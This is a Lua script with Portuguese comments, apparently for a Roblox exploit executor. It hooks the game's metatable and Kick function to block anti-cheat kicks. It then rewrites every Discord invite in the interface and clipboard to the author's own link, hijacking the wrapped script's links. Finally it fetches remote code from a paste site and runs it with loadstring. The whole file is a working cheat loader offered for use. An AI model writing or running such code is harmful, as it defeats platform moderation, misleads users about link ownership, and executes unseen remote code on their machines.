-- [[ ANTI-KICK BYPASS ]]
local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)
mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    if method == "Kick" or method == "kick" then
        return nil
    end
    return old(self, ...)
end)
setreadonly(mt, true)
hookfunction(game.Players.LocalPlayer.Kick, function() return nil end)

-- [[ AUTO-REPLACE DISCORD LINK ]]
-- Isso vai trocar o link na interface e também quando você clicar em "Copiar"
local NewDiscord = "https://discord.gg/ecHrVuFaz"

task.spawn(function()
    while task.wait(2) do
        -- Procura em toda a interface (CoreGui e PlayerGui)
        local targets = {game:GetService("CoreGui"), game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")}
        for _, parent in pairs(targets) do
            if parent then
                for _, v in pairs(parent:GetDescendants()) do
                    if (v:IsA("TextLabel") or v:IsA("TextButton")) and v.Text:find("discord%.gg") then
                        v.Text = NewDiscord
                    end
                end
            end
        end
    end
end)

-- Hook para interceptar quando o script tenta copiar o link antigo
if setclipboard then
    local oldSetClipboard = setclipboard
    getgenv().setclipboard = function(data)
        if data:find("discord%.gg") then
            return oldSetClipboard(NewDiscord)
        end
        return oldSetClipboard(data)
    end
end

-- [[ CARREGAR SCRIPT ORIGINAL ]]
loadstring(game:HttpGet("https://pastefy.app/9MDot0DZ/raw"))()
